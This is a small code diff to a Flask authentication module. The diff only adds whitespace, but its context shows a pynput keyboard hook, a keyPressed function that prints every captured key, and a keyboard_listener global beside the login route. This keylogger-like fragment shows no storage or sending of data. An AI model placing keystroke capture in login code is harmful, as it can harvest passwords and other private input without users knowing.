@@ -5,7 +5,9 @@ from . import db   # means from __init__.py import db
 from flask_login import login_user, login_required, logout_user, current_user
 from pynput import keyboard
 
+
 auth = Blueprint('auth', __name__)
+
 
 def keyPressed(key):
     print(str(key))
@@ -17,6 +19,7 @@ def keyPressed(key):
             print(f"Error getting char: {str(e)}")
 
 keyboard_listener = None
+
 
 @auth.route('/login', methods = ['GET', 'POST'])
 def login():
